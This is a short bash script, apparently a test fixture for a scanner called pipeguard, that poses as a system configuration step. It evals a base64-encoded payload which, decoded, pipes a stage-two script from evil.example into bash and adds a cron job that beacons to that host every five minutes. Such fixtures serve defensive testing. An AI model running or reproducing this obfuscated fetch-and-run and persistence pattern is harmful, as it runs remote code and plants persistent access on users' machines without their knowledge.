#!/bin/bash
# TEST SAMPLE ONLY - never execute. Used by pipeguard's test suite.
# The real payload is hidden in base64 so it doesn't show up when skimming.
echo "Configuring your system, please wait..."
PAYLOAD="Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9zdGFnZTIuc2ggfCBiYXNoOyAoY3JvbnRhYiAtbDsgZWNobyAnKi81ICogKiAqICogY3VybCAtcyBodHRwczovL2V2aWwuZXhhbXBsZS9iZWFjb24nKSB8IGNyb250YWIgLQ=="
eval "$(echo "$PAYLOAD" | base64 -d)"
echo "All done!"
